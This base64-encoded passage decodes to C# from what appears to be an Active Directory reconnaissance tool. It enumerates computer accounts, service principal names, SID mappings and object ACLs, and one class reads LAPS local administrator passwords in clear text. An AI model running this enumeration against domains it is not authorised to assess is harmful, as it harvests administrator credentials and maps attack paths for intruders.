IERlbGVnYXRpb25TZXJ2aWNlcykpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVXNlck5hbWUiLCAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJzYW1hY2NvdW50bmFtZSJdLkNvdW50ICE9IDAgPyBBZENvbXB1dGVyLlByb3BlcnRpZXNbInNhbWFjY291bnRuYW1lIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlByaW1hcnkgR3JvdXAgSUQiLCAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJwcmltYXJ5Z3JvdXBpZCJdLkNvdW50ICE9IDAgPyBBZENvbXB1dGVyLlByb3BlcnRpZXNbInByaW1hcnlncm91cGlkIl1bMF0gOiAiIikpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNJRCIsIENvbnZlcnQuVG9TdHJpbmcobmV3IFNlY3VyaXR5SWRlbnRpZmllcigoYnl0ZVtdKUFkQ29tcHV0ZXIuUHJvcGVydGllc1sib2JqZWN0U0lEIl1bMF0sIDApKSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiU0lESGlzdG9yeSIsIFNJREhpc3RvcnkpKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlc2NyaXB0aW9uIiwgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1siRGVzY3JpcHRpb24iXS5Db3VudCAhPSAwID8gQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJEZXNjcmlwdGlvbiJdWzBdIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJtcy1kcy1DcmVhdG9yU2lkIiwgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibXMtZHMtQ3JlYXRvclNpZCJdLkNvdW50ICE9IDAgPyBDb252ZXJ0LlRvU3RyaW5nKG5ldyBTZWN1cml0eUlkZW50aWZpZXIoKGJ5dGVbXSlBZENvbXB1dGVyLlByb3BlcnRpZXNbIm1zLWRzLUNyZWF0b3JTaWQiXVswXSwgMCkpIDogIiIpKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMYXN0IExvZ29uIERhdGUiLCBMYXN0TG9nb25EYXRlKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJQYXNzd29yZCBMYXN0U2V0IiwgUGFzc3dvcmRMYXN0U2V0KSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJVc2VyQWNjb3VudENvbnRyb2wiLCAoQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJ1c2VyYWNjb3VudGNvbnRyb2wiXS5Db3VudCAhPSAwID8gQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJ1c2VyYWNjb3VudGNvbnRyb2wiXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIENvbXB1dGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCBBZENvbXB1dGVyLlByb3BlcnRpZXNbIndoZW5jcmVhdGVkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBDb21wdXRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgQWRDb21wdXRlci5Qcm9wZXJ0aWVzWyJ3aGVuY2hhbmdlZCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkIE5hbWUiLCBBZENvbXB1dGVyLlByb3BlcnRpZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyBDb21wdXRlck9iaiB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBDb21wdXRlclNQTlJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkQ29tcHV0ZXIgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgTGlzdDxQU09iamVjdD4gU1BOTGlzdCA9IG5ldyBMaXN0PFBTT2JqZWN0PigpOwoKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChTdHJpbmcgU1BOIGluIEFkQ29tcHV0ZXIuUHJvcGVydGllc1sic2VydmljZXByaW5jaXBhbG5hbWUiXSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0cmluZ1tdIFNQTkFycmF5ID0gU1BOLlNwbGl0KCcvJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGJvb2wgZmxhZyA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFBTT2JqZWN0IE9iaiBpbiBTUE5MaXN0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIChTdHJpbmcpIE9iai5NZW1iZXJzWyJTZXJ2aWNlIl0uVmFsdWUgPT0gU1BOQXJyYXlbMF0gKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iai5NZW1iZXJzWyJIb3N0Il0uVmFsdWUgPSBTdHJpbmcuSm9pbigiLCIsIChPYmouTWVtYmVyc1siSG9zdCJdLlZhbHVlICsgIiwiICsgU1BOQXJyYXlbMV0pLlNwbGl0KCcsJykuRGlzdGluY3QoKS5Ub0FycmF5KCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZsYWcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmxhZykKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQ29tcHV0ZXJTUE5PYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbXB1dGVyU1BOT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibmFtZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlclNQTk9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZpY2UiLCBTUE5BcnJheVswXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJTUE5PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJIb3N0IiwgU1BOQXJyYXlbMV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNQTkxpc3QuQWRkKCBDb21wdXRlclNQTk9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBTUE5MaXN0LlRvQXJyYXkoKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgTEFQU1JlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkQ29tcHV0ZXIgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgYm9vbCBQYXNzd29yZFN0b3JlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIERhdGVUaW1lPyBDdXJyZW50RXhwaXJhdGlvbiA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibXMtbWNzLWFkbXB3ZGV4cGlyYXRpb250aW1lIl0uQ291bnQgIT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEN1cnJlbnRFeHBpcmF0aW9uID0gRGF0ZVRpbWUuRnJvbUZpbGVUaW1lKChsb25nKShBZENvbXB1dGVyLlByb3BlcnRpZXNbIm1zLW1jcy1hZG1wd2RleHBpcmF0aW9udGltZSJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhc3N3b3JkU3RvcmVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgTEFQU09iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgIExBUFNPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJIb3N0bmFtZSIsIChBZENvbXB1dGVyLlByb3BlcnRpZXNbImRuc2hvc3RuYW1lIl0uQ291bnQgIT0gMCA/IEFkQ29tcHV0ZXIuUHJvcGVydGllc1siZG5zaG9zdG5hbWUiXVswXSA6IEFkQ29tcHV0ZXIuUHJvcGVydGllc1siY24iXVswXSApKSk7CiAgICAgICAgICAgICAgICAgICAgTEFQU09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlN0b3JlZCIsIFBhc3N3b3JkU3RvcmVkKSk7CiAgICAgICAgICAgICAgICAgICAgTEFQU09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlJlYWRhYmxlIiwgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibXMtbWNzLWFkbXB3ZCJdLkNvdW50ICE9IDAgPyB0cnVlIDogZmFsc2UpKSk7CiAgICAgICAgICAgICAgICAgICAgTEFQU09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBhc3N3b3JkIiwgKEFkQ29tcHV0ZXIuUHJvcGVydGllc1sibXMtbWNzLWFkbXB3ZCJdLkNvdW50ICE9IDAgPyBBZENvbXB1dGVyLlByb3BlcnRpZXNbIm1zLW1jcy1hZG1wd2QiXVswXSA6IG51bGwpKSk7CiAgICAgICAgICAgICAgICAgICAgTEFQU09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkV4cGlyYXRpb24iLCBDdXJyZW50RXhwaXJhdGlvbikpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IExBUFNPYmogfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgU0lEUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkT2JqZWN0ID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5Qcm9wZXJ0aWVzWyJvYmplY3RjbGFzcyJdW0FkT2JqZWN0LlByb3BlcnRpZXNbIm9iamVjdGNsYXNzIl0uQ291bnQtMV0pKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidXNlciI6CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNvbXB1dGVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZ3JvdXAiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTERBUENsYXNzLkFkU0lERGljdGlvbmFyeS5BZGQoQ29udmVydC5Ub1N0cmluZyhuZXcgU2VjdXJpdHlJZGVudGlmaWVyKChieXRlW10pQWRPYmplY3QuUHJvcGVydGllc1sib2JqZWN0U0lEIl1bMF0sIDApKSwgKENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuUHJvcGVydGllc1sibmFtZSJdWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIERBQ0xSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFNlYXJjaFJlc3VsdCBBZE9iamVjdCA9IChTZWFyY2hSZXN1bHQpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gbnRTZWN1cml0eURlc2NyaXB0b3IgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBOYW1lID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgVHlwZSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgTGlzdDxQU09iamVjdD4gREFDTExpc3QgPSBuZXcgTGlzdDxQU09iamVjdD4oKTsKCiAgICAgICAgICAgICAgICAgICAgTmFtZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuUHJvcGVydGllc1sibmFtZSJdWzBdKTsKCiAgICAgICAgICAgICAgICAgICAgc3dpdGNoIChDb252ZXJ0LlRvU3RyaW5nKEFkT2JqZWN0LlByb3BlcnRpZXNbIm9iamVjdGNsYXNzIl1bQWRPYmplY3QuUHJvcGVydGllc1sib2JqZWN0Y2xhc3MiXS5Db3VudC0xXSkpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1c2VyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiVXNlciI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiY29tcHV0ZXIiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJDb21wdXRlciI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZ3JvdXAiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJHcm91cCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiY29udGFpbmVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiQ29udGFpbmVyIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJncm91cFBvbGljeUNvbnRhaW5lciI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUeXBlID0gIkdQTyI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gQ29udmVydC5Ub1N0cmluZyhBZE9iamVjdC5Qcm9wZXJ0aWVzWyJkaXNwbGF5bmFtZSJdWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJvcmdhbml6YXRpb25hbFVuaXQiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9ICJPVSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZG9tYWluRE5TIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR5cGUgPSAiRG9tYWluIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgVHlwZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRPYmplY3QuUHJvcGVydGllc1sib2JqZWN0Y2xhc3MiXVtBZE9iamVjdC5Qcm9wZXJ0aWVzWyJvYmplY3RjbGFzcyJdLkNvdW50LTFdKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgLy8gV2hlbiB0aGUgdXNlciBpcyBub3QgYWxsb3dlZCB0byBxdWVyeSB0aGUgbnRzZWN1cml0eWRlc2NyaXB0b3IgYXR0cmlidXRlLgogICAgICAgICAgICAgICAgICAgIGlmIChBZE9iamVjdC5Qcm9wZXJ0aWVzWyJudHNlY3VyaXR5ZGVzY3JpcHRvciJdLkNvdW50ICE9IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBudFNlY3VyaXR5RGVzY3JpcHRvciA9IChieXRlW10pIEFkT2JqZWN0LlByb3BlcnRpZXNbIm50c2VjdXJpdHlkZXNjcmlwdG9yIl1bMF07CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIERpcmVjdG9yeUVudHJ5IEFkT2JqZWN0RW50cnkgPSAoKFNlYXJjaFJlc3VsdClyZWNvcmQpLkdldERpcmVjdG9yeUVudHJ5KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIG50U2VjdXJpdHlEZXNjcmlwdG9yID0gKGJ5dGVbXSkgQWRPYmplY3RFbnRyeS5PYmplY3RTZWN1cml0eS5HZXRTZWN1cml0eURlc2NyaXB0b3JCaW5hcnlGb3JtKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmIChudFNlY3VyaXR5RGVzY3JpcHRvciAhPSBudWxsKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgRGlyZWN0b3J5T2JqZWN0U2VjdXJpdHkgRGlyT2JqU2VjID0gbmV3IEFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIERpck9ialNlYy5TZXRTZWN1cml0eURlc2NyaXB0b3JCaW5hcnlGb3JtKG50U2VjdXJpdHlEZXNjcmlwdG9yKTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0aG9yaXphdGlvblJ1bGVDb2xsZWN0aW9uIEFjY2Vzc1J1bGVzID0gKEF1dGhvcml6YXRpb25SdWxlQ29sbGVjdGlvbikgRGlyT2JqU2VjLkdldEFjY2Vzc1J1bGVzKHRydWUsdHJ1ZSx0eXBlb2YoU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSBSdWxlIGluIEFjY2Vzc1J1bGVzKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmcgSWRlbnRpdHlSZWZlcmVuY2UgPSBDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuSWRlbnRpdHlSZWZlcmVuY2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIE93bmVyID0gQ29udmVydC5Ub1N0cmluZyhEaXJPYmpTZWMuR2V0T3duZXIodHlwZW9mKFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgT2JqZWN0T2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQ2xlYW5TdHJpbmcoTmFtZSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlR5cGUiLCBUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPYmplY3RUeXBlTmFtZSIsIExEQVBDbGFzcy5HVUlEc1tDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuT2JqZWN0VHlwZSldKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0ZWRPYmplY3RUeXBlTmFtZSIsIExEQVBDbGFzcy5HVUlEc1tDb252ZXJ0LlRvU3RyaW5nKFJ1bGUuSW5oZXJpdGVkT2JqZWN0VHlwZSldKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY3RpdmVEaXJlY3RvcnlSaWdodHMiLCBSdWxlLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjZXNzQ29udHJvbFR5cGUiLCBSdWxlLkFjY2Vzc0NvbnRyb2xUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJZGVudGl0eVJlZmVyZW5jZU5hbWUiLCBMREFQQ2xhc3MuQWRTSUREaWN0aW9uYXJ5LkNvbnRhaW5zS2V5KElkZW50aXR5UmVmZXJlbmNlKSA/IExEQVBDbGFzcy5BZFNJRERpY3Rpb25hcnlbSWRlbnRpdHlSZWZlcmVuY2VdIDogSWRlbnRpdHlSZWZlcmVuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk93bmVyTmFtZSIsIExEQVBDbGFzcy5BZFNJRERpY3Rpb25hcnkuQ29udGFpbnNLZXkoT3duZXIpID8gTERBUENsYXNzLkFkU0lERGljdGlvbmFyeVtPd25lcl0gOiBPd25lcikpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkIiwgUnVsZS5Jc0luaGVyaXRlZCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0RmxhZ3MiLCBSdWxlLk9iamVjdEZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZUZsYWdzIiwgUnVsZS5Jbmhlcml0YW5jZUZsYWdzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJJbmhlcml0YW5jZVR5cGUiLCBSdWxlLkluaGVyaXRhbmNlVHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiUHJvcGFnYXRpb25GbGFncyIsIFJ1bGUuUHJvcGFnYXRpb25GbGFncykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiT2JqZWN0VHlwZSIsIFJ1bGUuT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSW5oZXJpdGVkT2JqZWN0VHlwZSIsIFJ1bGUuSW5oZXJpdGVkT2JqZWN0VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0T2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiSWRlbnRpdHlSZWZlcmVuY2UiLCBSdWxlLklkZW50aXR5UmVmZXJlbmNlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJPd25lciIsIE93bmVyKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIEFkT2JqZWN0LlByb3BlcnRpZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIERBQ0xMaXN0LkFkZCggT2JqZWN0T2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiBEQUNMTGlzdC5Ub0FycmF5KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgY2xhc3MgU0FDTFJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1